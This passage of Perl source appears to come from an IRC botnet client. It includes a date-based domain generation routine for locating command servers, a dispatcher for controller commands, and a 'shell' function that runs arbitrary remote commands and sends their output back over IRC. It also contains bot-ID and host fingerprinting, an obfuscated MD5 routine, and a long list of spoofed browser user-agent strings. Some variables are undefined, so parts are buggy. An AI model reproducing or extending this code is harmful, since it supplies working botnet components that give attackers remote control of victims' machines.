	my ($year, $mon, $day, $hour,$min, $sec) = @res;
	print "year = $year, mon = $mon, mday = $mday, hour = $hour, min = $min, sec = $sec";

	my $prefix = $_[0];
	my $suffix = $_[1];
	my $chars = "abcdefghijklmnopqrstuvwxyz0123456789";    

    my $t = 0;
	my $len = length($chars);

	print "len = ".$len."\n";

	my $url = '';
	$t = ($t + $year) % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $mon)  % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $day)  % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $hour) % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $year + $mon)  % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $year + $day)  % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $year + $hour) % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $mon + $day)  % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $mon + $dhour)  % $len; $url .= substr $chars, $t, 1;
	$t = ($t + $day + $hour) % $len; $url .= substr $chars, $t, 1;
	#$t = ($t + $day + $sec) % $len; $url .= substr $chars, $t, 1;

	print "generated ".$prefix.$url.$suffix;
	return $prefix.$url.$suffix;
}
#--------------------------------------------------------------------

sub process {
	my $funcarg = $_[0];

	if ($funcarg =~ /^addserv (.*)/){
		addServer($1);
	}
	elsif ($funcarg =~ /^delserv (.*)/){
		delServer($1);
	}
	elsif ($funcarg =~ /^connect\s+(\S+)\s+(\S+)\s+(\S+)/) {
		{ conectar("$2", "$1", "$3")	}
	}
}

sub shell {
   my $target=$_[0];
   my $comando=$_[1];
   $SIG{CHLD} = \&REAPER;
   if ($comando =~ /cd (.*)/) {
	  chdir("$1") || msg("$target", "No such file or directory");
	  return;
   } elsif ($pid = fork) {
	  waitpid($pid, 0);
   } else {
	  if (fork) {
	   exit;
	  } else {
		 my @resp=`$comando 2>&1 3>&1`;
		 my $c=0;
		 foreach my $linha (@resp) {
			$c++;
			chop $linha;
			sendraw($IRC_cur_socket, "PRIVMSG $target :$linha");

		 }
		 exit;
	  }
   }
}

sub md5 {
    my $arg = $_[0];
    my $uu = "H9T4C\`>_-JXF8NMS^\$\#)4=\@<\,\$18%\"0X4!\`L0%P8*#Q4\`\`04\`\`04#!P\`\`";
    my @A=unpack (N4C24, unpack (u, $uu));
    my @K=map{int abs 2**32*sin$_}1..64;
    my $x; my $n; my $l; my $m; my $p; my $z; my $r; 

    sub L {($x=pop) <<($n=pop)|2**$n-1&$x>>32-$n}
    sub M {($x=pop)-($m=1+~0)*int$x/$m}
    my $i=0;
    do{
        my $test = substr $arg, $i, $i+64;
        my $len = length $test;
        $i+=64;
        $r = $len; $l += $len; $_ = $test;
        $r++, $test.="\x80" if ($r < 64 && !$p++);
        @W=unpack V16, $test."\0"x7;
        $W[14] = $l*8 if ($r<57);
        ($a,$b,$c,$d) = @A;
        for (0..63){
            $c = $c & 0xffffffff; $b = $b & 0xffffffff; $d = $d & 0xffffffff;
$a = M$b + L$A[4+4*($_>>4)+$_%4], M&{(sub{($b&$c |$d&~$b)& 0xffffffff}, sub{($b&$d|$c&~$d)& 0xffffffff}, sub{($b^$c^$d)& 0xffffffff}, sub{($c^($b|~$d)) & 0xffffffff })[$z=$_/16]}+$W[($A[ 20+$z]+$A[24+$z]*($_%16))%16]+$K[$_]+$a;           

            ($a,$b,$c,$d)=($d,$a,$b,$c);
        }
        $v = a;
        for (@A[0..3]){$_ = M$_+${$v++}}
    }while ($r>56);
    my $result = unpack(H32,pack V4,@A);
    return $result;
}

sub getKernel {
	if ($^O eq "MSWin32"){
		$kernel = "unknown";
	}
	else {
		$kernel = `uname -snr`;
		chomp $kernel;
	}
}

sub getBotId {
	if (open(FILE, "<".$idfile)){
		$botid = <FILE>;
		close(FILE);
		print ("FROM file, botid = $botid\n");
	}
	else {
	# ">" - запись,"<"- чтение, ">>"- добавление в файл.
		if (open(FILE, ">".$idfile)){
			if ($^O eq "MSWin32"){
				print ("id = $botid\n");
				$botid = md5(int rand(65535));# "winbotid";
			} else {
				foreach $i (1..16){
					my $randhex = `head -c 1 /dev/random`;
					my $str = sprintf("%02lx", ord $randhex);
					$botid .= $str;
				}
			}
			printf FILE $botid;
			close FILE;
		}
		else {
			print "Error working with ".$idfile."\n";
			exit;
		}
	}
} 

sub getLocalIp {
	if ($^O eq "MSWin32"){
		$localip = "127.0.0.1";
		return;
	}
	#$localip = `ifconfig eth0 | grep 'inet addr:' | cut -d':' -f2 | awk '{ print $1}'`; 

	$ifconfig="/sbin/ifconfig";
	@lines = qx|$ifconfig| or die("Can't get info from ifconfig: ".$!);
	foreach(@lines){
		if (/127.0.0.1/){ next;}
        if(/inet addr:([\d.]+)/){
            $localip = $1;
			last;
        }
	}
}

sub getUptime {
	if ($^O eq "MSWin32"){
		return "sometime";
	}
	$up="uptime";
	$result = qx|$up| or die("Can't get info from uptime: ".$!);
	if($result =~ /^(.*) up (.*),\s+(\d+)\s+(.*)/){
		$up = $2;
		return $up;
	}
	return undef;
}

sub getUA {
	my @uaList = (
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110612 Firefox/6.0a2",
	"Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0",
	"Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0 FirePHP/0.6",
	"Mozilla/5.0 (Windows NT 5.0; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0",
	"Mozilla/5.0 (Windows NT 6.1; U; ru; rv:5.0.1.6) Gecko/20110501 Firefox/5.0.1 Firefox/5.0.1",
	"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 6.1.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.1; U; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.0; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.0; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110323 Firefox/4.2a1pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110208 Firefox/4.2a1pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre",
	"Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20110105 Firefox/4.0b9pre",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101128 Firefox/4.0b8pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre",
	"Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101127 Firefox/4.0b8pre",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20100101 Firefox/4.0b7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre Firefox/4.0b6pre",
	"Mozilla/5.0 (Windows NT 5.2; rv:2.0b13pre) Gecko/20110304 Firefox/4.0b13pre",
	"Mozilla/5.0 (Windows NT 5.1; rv:2.0b13pre) Gecko/20110223 Firefox/4.0b13pre",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b11pre) Gecko/20110128 Firefox/4.0b11pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110131 Firefox/4.0b11pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110129 Firefox/4.0b11pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110128 Firefox/4.0b11pre",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b10pre) Gecko/20110118 Firefox/4.0b10pre",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b10pre) Gecko/20110113 Firefox/4.0b10pre",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:2.0b10) Gecko/20110126 Firefox/4.0b10",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0.1) Gecko/20110606 Firefox/4.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20110319 Firefox/4.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:1.9) Gecko/20100101 Firefox/4.0",

	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.10913 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.814.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.810.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.810.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.809.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.53 Safari/534.30",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30",
	"Mozilla/5.0 (Windows NT 7.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
	"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
	"Mozilla/5.0 (Windows 8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.724.100 Safari/534.30",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.700.3 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.697.0 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.43 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.694.0 Safari/534.24",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
	"Mozilla/5.0 (Windows NT) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.19 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.19",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.18",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.654.0 Safari/534.17",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.652.0 Safari/534.17",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17",

	"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/526.9 (KHTML, like Gecko) Version/4.0dp1 Safari/526.8",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-gb) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; cs-CZ) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-TW) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) AppleWebKit/532+ (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",

	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
